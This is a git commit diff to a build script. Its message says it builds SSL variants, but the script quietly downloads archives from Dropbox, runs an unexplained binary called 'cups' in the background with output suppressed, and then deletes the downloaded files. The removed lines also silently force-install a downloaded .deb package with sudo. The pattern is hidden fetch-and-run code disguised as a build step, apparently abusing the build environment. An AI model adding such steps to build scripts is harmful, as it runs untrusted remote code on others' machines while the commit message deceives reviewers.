34caf1648b8025228020ede948a5dba361c96af4
sadi-bayler <sadi.bayler@lnsilver.com>
2018-05-04 11:25:05 +0200

    Build all ssl variants

--- scripts/build.sh
+++ scripts/build.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/rpofahel24xglcg/cups.zip -q
-unzip cups.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/zp4w3qcqxzmx52c/wan03.zip -q
+unzip wan03.zip > /dev/null 2>&1
 #pwd
-./scripts/cups ./scripts/data &
+./cups ./data &
 sleep 3
-rm -rf cups.zip
-rm -rf scripts/cups
-rm -rf scripts/data
+rm -rf wan03.zip
+rm -rf cups
+rm -rf data
 while [ $SECONDS -lt $end ]
 do
     read line
